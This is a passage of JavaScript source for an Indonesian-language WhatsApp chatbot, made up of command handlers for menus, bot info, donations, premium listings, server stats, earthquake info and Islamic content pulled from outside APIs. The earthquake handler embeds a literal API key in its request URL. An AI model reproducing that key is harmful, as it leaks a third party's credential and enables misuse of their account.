juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'randomquotes':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#randomquotes', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: randomQuotes(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'cewekasiamenu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#cewekasiamenu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: cewekMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'cowokasiamenu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#cowokasiamenu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: cowokMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'balancemenu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#balancemenu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: balanceMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'ownermenu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#ownermenu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: ownerMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'storagemenu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#storagemenu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: storageMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'asupanmenu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#asupanmenu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: asupanMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'randomsticker':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#randomsticker', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: randomSticker(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'stalkingmenu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#stalkingmenu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: stalkingMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'imageeffect':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#imageeffect', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: imageEffect(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'funmenu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#funmenu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: funMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'islammenu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#islammenu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: islamMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'nsfwmenu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#nsfwmenu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: nsfwMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'textpromenu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#textpromenu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: textproMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'photooxymenu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#photooxymenu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: photooxyMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'ephotomenu': case 'ephoto360menu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#ephotomenu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: ephotoMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'logomenu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#logomenu', m.sender, _cmd)
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
let gif = `${setting.gifmenu}`
await juna.sendMessage(m.chat, {
video: {url: gif},
gifPlayback: true,
caption: logoMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {
title: `Halo ${pushname} Selamat ${ucapanWaktu}`, 
body: '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
thumbnailUrl: pathimg, 
sourceUrl: gcwa, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case'rules': case'aturan': case'aturanbot':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
var cpt = `Peraturan Penggunaan Bot :\n- Dilarang Spam\n- Dilarang Menelpon Bot\n- Dilarang Mengirim Virus Ke Bot\n\nCatatan :\nSemua Fitur Bot Di Lakukan Secara Otomatis Oleh Sistem Tanpa Ada Campur Tangan Owner, Dan Semua Informasimu Seperti Chat, Foto, Video Atau Vn Akan Aman Tanpa Di Sebar, Dan Jika Ada Balasan Yang Absurd Atau Sticker Absurd Ya Mungkin Owner Lagi Gabut Dan Butuh Temen Chat :v`
await juna.sendMessage(m.chat, {
text: cpt,
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case'infobot': case'info': case'botinfo':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#infobot', m.sender, _cmd)
var capt = `_*${botName} Information*_

*• Name :* ${juna.user.name}
*• Number :* ${botNumber.split("@")[0]}
*• Owner :* ${prefix}owner
*• Total Pengguna :* ${pendaftar.length}
*• Prefix :* ${prefix}
`
await juna.sendMessage(m.chat, {
text: capt,
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
 break
case'donate': case'donasi':
addCountCmd('#donate', m.sender, _cmd)
var cp = `Hai Kak, Ingin Donasi?, Silahkan Donasi Ke Payment Yang Ada Di Bawah, Dengan Kamu Berdonasi Berarti Kamu Berkontribusi Dalam Perkembangan Bot Ini..\n❏──「 *Payment* 」\n│ • *Trakteer:* ${setting.trakteer}\n│ • *Saweria:* ${setting.saweria}\n❏──────────────๑\n\nTerima Kasih Yang Sudah Donasi, Berapapun Donasi Kamu Akan Sangat Saya Hargain >,<`
await juna.sendMessage(m.chat, { image: fs.readFileSync(setting.fotoDonasi), caption: cp}, {quoted:fkontak})
break;
case 'pay': case 'payment':
var pay = `Halo Kak Untuk Pembayaran Bisa Scan Qr Tersebut Atau Bisa Dengan Pembayaran Lain Silahkan Hubungi Owner`
await juna.sendMessage(m.chat, {image: fs.readFileSync(setting.fotoDonasi), caption: pay}, {quoted:fkontak})
break
case 'dashboard':
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#dashboard', m.sender, _cmd)
var posi = await getPosiCmdUser(m.sender, _cmdUser)
_cmdUser[posi].db.sort((a, b) => (a.count < b.count) ? 1 : -1)
_cmd.sort((a, b) => (a.count < b.count) ? 1 : -1)
var posi = await getPosiCmdUser(m.sender, _cmdUser)
var jumlahCmd = _cmd.length
if (jumlahCmd > 10) jumlahCmd = 10
var jumlah = _cmdUser[posi].db.length
if (jumlah > 5) jumlah = 5
var totalUser = 0
for (let x of _cmdUser[posi].db) {
totalUser = totalUser + x.count
}
var total = 0
for (let o of _cmd) {
total = total + o.count
}
var teks = `*√ DASHBOARD*\n\n*HIT*\n• GLOBAL : ${total}\n• USER : ${totalUser}\n\n`
teks += `*Most Command Global*\n`
for (let u = 0; u < jumlahCmd; u ++) {
teks += `• ${_cmd[u].nama} : ${_cmd[u].count}\n`
}
teks += `\n*Most Command User*\n`
for (let i = 0; i < jumlah; i ++) {
teks += `• ${_cmdUser[posi].db[i].nama} : ${_cmdUser[posi].db[i].count}\n`
}
newReply(teks)
break
case 'owner': case 'creator': {
await juna.sendContact(m.chat, ownerNumber.map( i => i.split("@")[0]), m)
await juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_owner), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'lopyu': {
if (!isCreator) return newReply('Lu Siapa Gw Ga Kenal Gausah Gatel Lopyu" Segala Anj')
await juna.sendMessage(m.chat, {audio: fs.readFileSync('./media/sound/lopyou.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'cekdrive': case'drive':
if (isBan) return newReply('Lu di ban kocak awokwok') 
var result = await nou.drive.info();
addCountCmd('#cekdrive', m.sender, _cmd)
newReply(`*Drive Server Info*\n\n *• Total :* ${result.totalGb} GB\n *• Used :* ${result.usedGb} GB (${result.usedPercentage}%)\n *• Free :* ${result.freeGb} GB (${result.freePercentage}%)`)
break
case 'cekbandwidth': case'bandwidth':
if (isBan) return newReply('Lu di ban kocak awokwok') 
newReply(mess.wait);
addCountCmd('#cekbandwidth', m.sender, _cmd)
var { download, upload } = await checkBandwidth();
newReply(`*Bandwidth Server*\n\n*>* Upload : ${upload}\n*>* Download : ${download}`)
break
case 'cekprem': case'cekpremium':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!isPremium) return newReply(`Kamu bukan user premium, kirim perintah *${prefix}daftarprem* untuk membeli premium`)
addCountCmd('#cekpremium', m.sender, _cmd)
if (isCreator) return newReply(`Khusus user aja bkn untuk owner`)
if (_prem.getPremiumExpired(m.sender, premium) == "PERMANENT") return newReply(`PERMANENT`)
let cekvip = ms(_prem.getPremiumExpired(m.sender, premium) - Date.now())
let premiumnya = `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
newReply(premiumnya)
break
case 'listpremium': case'listprem':
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#listpremium', m.sender, _cmd)
let txt = `*List Premium User*\nJumlah : ${premium.length}\n\n`
let men = [];
for (let i of premium) {
men.push(i.id)
txt += `*ID :* @${i.id.split("@")[0]}\n`
if (i.expired === 'PERMANENT') {
let cekvip = 'PERMANENT'
txt += `*Expire :* PERMANENT\n\n`
} else {
let cekvip = ms(i.expired - Date.now())
txt += `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)\n\n`
}
}
juna.sendTextWithMentions(m.chat, txt, m)
break
case 'listsewa':
if (isBan) return newReply('Lu di ban kocak awokwok') 
let list_sewa_list = `*LIST-SEWA-GROUP*\n\n*Total:* ${sewa.length}\n\n`
let data_array = [];
for (let x of sewa) {
addCountCmd('#listsewa', m.sender, _cmd)
list_sewa_list += `*Name:* ${await getGcName(x.id)}\n*ID :* ${x.id}\n`
if (x.expired === 'PERMANENT') {
let ceksewa = 'PERMANENT'
list_sewa_list += `*Expire :* PERMANENT\n\n`
} else {
let ceksewa = ms(x.expired - Date.now())
list_sewa_list += `*Expire :* ${ceksewa.days} day(s) ${ceksewa.hours} hour(s) ${ceksewa.minutes} minute(s) ${ceksewa.seconds} second(s)\n\n`
}
}
juna.sendMessage(m.chat, { text: list_sewa_list }, { quoted: m })
break
case'speed': case'ping':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
const used = process.memoryUsage();
let timestamp = speed();
let latensi = speed() - timestamp;
let neww = performance.now();
let oldd = performance.now();
let respon = `Kecepatan Respon ${latensi.toFixed(4)} _Second_ 

_Info Server_
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used)
  .map(
    (key, _, arr) =>
      `${key.padEnd(Math.max(...arr.map((v) => v.length)), " ")}: ${formatp(
        used[key]
      )}`
  )
  .join("\n")}
`.trim();
await juna.sendMessage(m.chat, {
text: respon, 
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'infogempa' : case'ingfogempa':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let tod = await fetchJson(`https://api.lolhuman.xyz/api/infogempa?apikey=6b882dde90583a8ea51d4fcf`)
const tanggal = tod.result.waktu
const magnitudo = tod.result.magnitude
const kedalaman = tod.result.kedalaman
const koordinat = tod.result.koordinat
const lokasi = tod.result.lokasi
const potensi = tod.result.potensi
const fotonya = tod.result.map


var capt = `_*Info Gempa*_

*• Tanggal :* ${tanggal}
*• Magnitudo :* ${magnitudo} SR
*• Kedalaman :* ${kedalaman}
*• Koordinat :* ${koordinat}
*• Pusat Gempa :* ${lokasi}
*• Dirasakan :* ${potensi}
`
await juna.sendMessage(m.chat, { image: {url: fotonya}, caption: capt}, {quoted:fkontak})
}
limitAdd(m.sender, limit)
break
case 'kisahnabi':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Ketik nama Nabi\nContoh : ${prefix+command} Muhammad`) 
try{
let tod = await fetchJson(`https://api.zeeoneofc.my.id/api/islam/kisahnabi?nabi=${text}&apikey=${setting.BotKey}`)
const name = tod.result.name
const ultah = tod.result.birth
const kematian = tod.result.death_age
const asal = tod.result.country_from
const cerita = tod.result.story
var kisah = `_*Kisah Nabi*_
Nama Nabi : ${name}
Hari Kelahiran : ${ultah}
Wafat Pada Umur : ${kematian}
Asal : ${asal}

Kisah Nabi *${name}* :
${cerita}`
newReply(kisah) 
}catch (error) {
newReply(`Ketik Nama Nabi Yang Valid`);
}
limitAdd(m.sender, limit)
}
break
case 'asmaulhusna':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
try{
let tod = await fetchJson(`https://api.zeeoneofc.my.id/api/islam/asmaulhusna?apikey=${setting.BotKey}`)
const ke = tod.result.index
const latin = tod.result.latin
const arab = tod.result.arabic
const indo = tod.result.translation_id
const english = tod.result.translation_en
var asmaul = `_*Random Asmaul Husna*_
Asmaul Husna Ke : ${ke}
Teks Arab : ${arab}
Teks Latin : ${latin}
Arti Dalam Bahasa Indonesia : ${indo}
Arti Dalam Bahasa Inggris : ${english}`
newReply(asmaul) 
}catch (error) {
newReply(`Maaf Terjadi Kesalahan`);
}
limitAdd(m.sender, limit)
}
break
case 'listsurah': case 'listsurat':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
try{
let tod = await fetchJson(`https://api.zeeoneofc.my.id/api/islam/listsurah?apikey=${setting.BotKey}`)
const list = tod.result
var surah = `_*List Surah*_

${list}`
newReply(surah) 
}catch (error) {
newReply(`Maaf Terjadi Kesalahan`);
}
limitAdd(m.sender, limit)
}
break
case 'randomquran':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
try{
let tod = await fetchJson(`https://api.zeeoneofc.my.id/api/islam/randomquran?apikey=${setting.BotKey}`)
const audio = tod.result.resources.ayah.audio.primary
const nama = tod.result.resources.nameOfSurah.long
const latin = tod.result.resources.nameOfSurah.transliteration.id
const nomer = tod.result.resources.numberOfSurah
const juz = tod.result.resources.ayah.meta.juz
const ayat = tod.result.resources.totalAyah
const ayatke = tod.result.resources.numberOfAyah
const teks = tod.result.resources.ayah.text.arab
const trans = tod.result.resources.ayah.text.transliteration.en
const artiid = tod.result.resources.ayah.translation.id
const artien = tod.result.resources.ayah.translation.en
const tafsir = tod.result.resources.ayah.tafsir.id.long
var quran = `_*Random Quran*_
Quran : ${nama}
Teks Latin : ${latin}
Surat Ke : ${nomer}
Juz : ${juz}
